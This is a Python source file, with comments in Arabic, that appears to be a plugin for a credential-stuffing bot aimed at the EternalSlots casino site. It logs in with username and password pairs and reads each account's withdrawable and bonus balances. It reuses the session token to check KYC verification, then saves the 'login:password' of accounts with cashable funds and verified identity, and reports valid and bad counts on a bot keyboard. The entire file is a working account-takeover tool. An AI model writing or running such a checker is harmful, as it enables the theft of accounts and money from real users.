from core.base_checker import BaseChecker
from typing import Dict, Any
import requests
import json

class EternalslotsChecker(BaseChecker):
    """EternalSlots site checker"""
    
    # الروابط الرئيسية
    LOGIN_URL = "https://api.eternalslots.com/authorization/signin"
    KYC_URL = "https://cash.eternalslots.com/Home/GetKycStatus"
    
    # الهيدرات المطلوبة
    HEADERS = {
        'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
        'Accept': "application/json, text/plain, */*",
        'Content-Type': "application/json",
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': "?1",
        'sec-ch-ua-platform': '"Android"',
        'origin': "https://eternalslots.com",
        'referer': "https://eternalslots.com/",
        'accept-language': "en-US,en;q=0.9",
    }
    
    # هيدرات خاصة بفحص KYC
    KYC_HEADERS = {
        'authority': 'cash.eternalslots.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://cash.eternalslots.com',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'x-requested-with': 'XMLHttpRequest',
    }
    
    def check_account(self, username: str, password: str) -> Dict[str, Any]:
        """Check single EternalSlots account"""
        try:
            session = requests.Session()
            session.headers.update(self.HEADERS)
            
            # 1. تسجيل الدخول
            payload = {
                "username": username,
                "password": password
            }
            
            response = session.post(
                self.LOGIN_URL,
                json=payload,
                timeout=20
            )
            
            # 2. تحقق من الاستجابة
            if response.status_code != 200:
                return {"status": "bad", "username": username}
            
            data = response.json()
            
            # 3. استخراج بيانات الرصيد
            withdrawable_balance = data.get("withdrawableBalance", 0)
            bonus_balance = data.get("bonusBalance", 0)
            playthrough_balance = data.get("playThroughBalance", 0)
            user_id = data.get("userId", "")
            
            # 4. التحقق من KYC إذا كان لدينا user_id
            kyc_status = False
            kyc_request_status = "Unknown"
            
            if user_id:
                try:
                    # استخدام جلسة منفصلة لفحص KYC
                    kyc_session = requests.Session()
                    kyc_session.headers.update(self.KYC_HEADERS)
                    
                    # نسخ الكوكيز من الجلسة الرئيسية
                    kyc_session.cookies.update(session.cookies.get_dict())
                    
                    # إضافة هيدرات إضافية
                    kyc_session.headers.update({
                        'referer': f'https://cash.eternalslots.com/?userId={user_id}&token={data.get("token", "")}&activeTab=3',
                        'cookie': '; '.join([f"{k}={v}" for k, v in session.cookies.get_dict().items()])
                    })
                    
                    # إرسال طلب KYC
                    kyc_response = kyc_session.post(
                        self.KYC_URL,
                        data={'userId': user_id},
                        timeout=15
                    )
                    
                    if kyc_response.status_code == 200:
                        kyc_data = kyc_response.json()
                        kyc_request_status = kyc_data.get("kycRequestStatus", "Unknown")
                        # التحقق من أن KYC مفعل
                        kyc_status = kyc_request_status == "Verified" or kyc_data.get("kycUserVerified") == True
                        
                except Exception as e:
                    print(f"KYC check error: {e}")
            
            # 5. تحديد نوع الحساب
            account_type = "empty"
            if withdrawable_balance > 0 and bonus_balance == 0 and playthrough_balance == 0:
                account_type = "withdraw_ready"
            elif bonus_balance > 0 or playthrough_balance > 0:
                account_type = "bonus_or_wager"
            
            # 6. رتب بيانات الحساب
            account_data = {
                "login": username,
                "password": password,
                "withdrawable_balance": withdrawable_balance,
                "bonus_balance": bonus_balance,
                "playthrough_balance": playthrough_balance,
                "account_type": account_type,
                "total_balance": withdrawable_balance + bonus_balance,
                "currency": "USD",
                "user_id": user_id,
                "email": data.get("email", ""),
                "is_verified": data.get("emailVerified", False),
                "kyc_status": kyc_status,
                "kyc_request_status": kyc_request_status,
                "token": data.get("token", ""),
            }
            
            return {
                "status": "valid",
                "account_data": account_data,
                "should_save": self.should_save(account_data)
            }
            
        except requests.exceptions.Timeout:
            return {"status": "error", "username": username, "error": "Timeout"}
        except requests.exceptions.ConnectionError:
            return {"status": "error", "username": username, "error": "Connection error"}
        except Exception as e:
            return {"status": "error", "username": username, "error": str(e)}
    
    def should_save(self, account_data: Dict[str, Any]) -> bool:
        """شروط حفظ الحساب"""
        # الشرط: رصيد قابل للسحب + KYC مفعل
        return (account_data.get("withdrawable_balance", 0) > 0 and 
                account_data.get("bonus_balance", 0) == 0 and
                account_data.get("kyc_status", False) == True)
    
    def save_format(self, account_data: Dict[str, Any]) -> str:
        """تنسيق حفظ الحساب في الملف"""
        return f"{account_data['login']}:{account_data['password']} | " \
               f"withdrawable=${account_data['withdrawable_balance']:.2f} | " \
               f"bonus=${account_data['bonus_balance']:.2f} | " \
               f"type={account_data['account_type']} | " \
               f"total=${account_data['total_balance']:.2f} | " \
               f"kyc={account_data['kyc_status']} | " 
    
    def get_stats_keyboard(self, stats: Dict[str, int]) -> Dict[str, Any]:
        """تخصيص لوحة الإحصائيات"""
        return {
            "type": "inline_keyboard",
            "buttons": [
                [{"text": f"🔄 Checked: {stats['checked']}/{stats['total']}", "callback_data": "progress"}],
                [
                    {"text": f"✅ Valid: {stats['valid']}", "callback_data": "valid"},
                    {"text": f"❌ Bad: {stats['bad']}", "callback_data": "bad"}
                ],
                [
                    {"text": f"⚠️ Error: {stats['error']}", "callback_data": "error"},
                    {"text": f"💰 KYC+Balance: {stats['saved']}", "callback_data": "saved"}
                ]
            ]
        }